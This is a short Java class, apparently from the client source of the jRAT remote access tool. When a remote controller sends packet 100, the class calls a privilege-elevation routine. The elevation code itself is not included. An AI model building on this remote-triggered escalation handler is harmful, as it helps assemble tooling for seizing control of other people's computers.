package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Elevation;

public class Packet100RequestElevation implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Elevation.executeElevation();
	}

}
